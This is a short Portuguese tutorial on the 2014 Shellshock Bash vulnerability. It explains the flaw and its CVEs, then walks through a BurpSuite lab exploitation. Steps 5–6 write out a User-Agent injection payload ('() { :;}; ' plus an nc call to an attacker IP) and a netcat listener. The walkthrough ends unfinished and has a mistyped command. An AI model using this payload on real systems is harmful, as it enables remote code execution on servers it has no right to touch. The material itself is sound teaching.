# ShellShock

Shellshock é um conjunto de falhas críticas descobertas em 24/09/2014 no **GNU Bash** (o shell padrão em muitos sistemas Unix-like). O erro está na forma como o Bash **importa funções via variáveis de ambiente**: um invasor consegue “colar” *comandos extras* depois da definição da função; ao iniciar, o Bash acabava executando esses comandos, resultando em **execução remota de código (RCE)**. 

**Exploração:**

Muitos serviços montam variáveis de ambiente e depois chamam o Bash. Se campos controlados pelo usuário (por exemplo, cabeçalhos HTTP em **CGI**), opções de **DHCP**, ou certos fluxos de **SSH** forem repassados ao ambiente e um processo acionar o Bash, os comandos injetados podem ser executados no host. Por isso a falha foi especialmente perigosa em servidores web com CGI habilitado. 

**Identificadores e alcance:**

Shellshock é uma vunerabilidade antiga, improvável de ser encontrada atualmente. O primeiro CVE foi **CVE-2014-6271**, seguido por correções adicionais (**CVE-2014-7169**, **CVE-2014-6277**, **CVE-2014-6278**, entre outros), porque patches iniciais não cobriam todos os vetores. Afetou diversas distribuições Linux e também o macOS da época, que receberam atualizações rapidamente.  Devido a sua importância à época, é usada hoje para fins didáticos.

## Análise do fluxo com BurpSuite

1. Abra o BurpSuite
2. Na guia **Proxy**, abra o browser do BurpSuite. Ele já vem configurado com atribuições de proxy.
3. No browser digite o IP da máquina alvo para abrir o seu website
4. Abra a aba **Target/SiteMap** do BurpSuite
5. Clique no método GET ditetório /cgi-bin/status.
  - Obeserve a linha **User-agente** do **request**
  - Substitua pelo comando nulo `() { :;}; `
  - Adicione o comando que deseja executar no alvo. Ex.: `nc 192.168.1.10 5555` (para conexão com o IP da máquina de ataque)
6. Na máquina de ataque inicie o netcat modo listener para conecção com o alvo `ns -lpv 5555`
7. 
    


